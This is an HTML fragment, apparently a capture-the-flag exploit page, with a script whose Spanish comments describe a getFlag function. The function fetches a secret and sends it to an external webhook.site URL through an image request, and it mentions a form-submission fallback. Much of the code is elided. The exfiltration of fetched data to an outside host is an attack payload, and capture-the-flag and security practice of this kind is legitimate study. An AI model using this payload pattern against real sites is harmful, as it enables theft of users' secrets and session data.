...
<body>
    ...
    <script>
        // Función mejorada que usa fetch en lugar de XMLHttpRequest síncrono
        async function getFlag() {
            try {
                ...
                if (response.ok) {
                    ...
                    // Enviar a webhook
                    const webhook = "https://webhook.site/085b2ea4-0c09-471e-a52a-59ef08ad9e07";
                    const img = new Image();
        ...
        // Versión alternativa usando form submission (más compatible)
